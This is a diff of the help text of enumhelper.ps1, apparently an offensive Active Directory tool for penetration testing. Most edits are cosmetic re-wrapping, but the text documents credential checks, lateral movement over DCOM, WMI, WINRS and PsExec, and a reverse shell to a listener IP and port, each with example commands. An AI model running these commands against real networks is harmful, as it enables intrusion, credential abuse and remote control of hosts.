@@ -35,13 +35,13 @@ $psexec_b64 = $psexec_base + 'B/1z3dO7ZTjju2U447tlOOcM5Qjza2U45wzlaPjrZTjnDOV48s
 if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
 {
   Write-Host "
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
   
  Usage: .\enumhelper.ps1 '<param1>' '<param2>' '<param3>' '<param4>' '<param5>' '<param6>' '<param7>'
   
   The '<param1>' is mandatory, if not defined will be prompted, the rest are optional.
  
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
   
   Using the parameters: '<param1>' == LDAP query, for example:
   .\enumhelper.ps1 '(&(SamAccountType=805306368)(name=p00p))'
@@ -55,7 +55,7 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   or
   .\enumhelper.ps1 '(&(SamAccountType=805306368)(name=p00p))' 'whencreated'
   
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
   
   For reminder, the SamAccountTypes to query for, you need to use the decimal notation:
   #SAM_DOMAIN_OBJECT 0x0 ------------------------> 0
@@ -71,7 +71,7 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   #SAM_APP_QUERY_GROUP 0x40000001 ---------------> 1073741825
   #SAM_ACCOUNT_TYPE_MAX 0x7fffffff --------------> 2147483647  
   
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
   
   Also some other stuff can be done with '<param1>':
   '<param1>' == 'spnlist'    -->  Prints out all SPNs and related objects
@@ -88,7 +88,7 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   .\enumhelper.ps1 'psexec' 
   .\enumhelper.ps1 'psexec64'
  
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
  
   Leveraging further with '<param2>':
   '<param1>' == 'spncheck' '<param2>' == 'account' -->  Check if any SPNs (services) are tied to a 
@@ -103,7 +103,7 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   .\enumhelper.ps1 'checksid' 'S-1-5-21-809893099-1472282828-2400958209-1105'
   .\enumhelper.ps1 'findsid' 'S-1-5-21-809893099-1472282828-2400958209-1105'
  
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
  
   And then there's '<param3>' which can be used to do user/pass queries against the AD:
   '<param1>' == 'auth' '<param2>' == 'username'  '<param3>' == 'password'
@@ -111,13 +111,14 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'auth' 'megaAdmin' 'verySecurePassword'
  
-  Or for lateral movement over DCOM (you need LA rights):
+  Or for lateral movement over DCOM (you need LA rights, also check the last section about 
+  reverse-shell):
   '<param1>' == 'dcom' '<param2>' == target IP '<param3>' == remote command
   
   For example:
   .\enumhelper.ps1 'dcom' '192.168.12.34' 'cmd /c calc.exe'
  
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
  
   By expanding further using '<param4>', you can try to remote over PowerShell, where
   '<param1>' == 'psremote' '<param2>' == 'username' '<param3>' == 'password' '<param4>' == 'hostname'
@@ -125,7 +126,8 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'psremote' 'adminusername' 'adminpassword' 'dc1.testad.local'
  
- With adding '<param5>' we can try to run remote commands over WMI, WINRS OR PSEXEC/64:
+  With adding '<param5>' we can try to move laterally and run remote commands over WMI, WINRS OR 
+  PSEXEC/64:
   '<param1>' == 'wmi' '<param2>' == 'username' '<param3>' == 'password'  '<param4>' == target IP
   '<param5>' == remote command to run
   or
@@ -145,9 +147,10 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   .\enumhelper.ps1 'psexec64' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
   !NOTE: you can just run with 'wmi' or 'winrs' and the rest will be prompted.
 
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
 
-  To further expand WMI / WINRS we can also launch a prebuilt reverse shell command, you just need to enter:
+  To further expand WMI / WINRS we can also launch a prebuilt reverse shell command, you just need to 
+  enter:
   '<param5>' == 'reverse-shell' '<param6>' == lhost IP '<param7>' == lhost port or use the same 
   param5 when prompted for a command:
   
@@ -164,7 +167,7 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'dcom' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
   
-<------------------------------------------------------------------------------------------------------->
+<----------------------------------------------------------------------------------------------------------->
  
   " -BackgroundColor Green -ForegroundColor Black
   exit
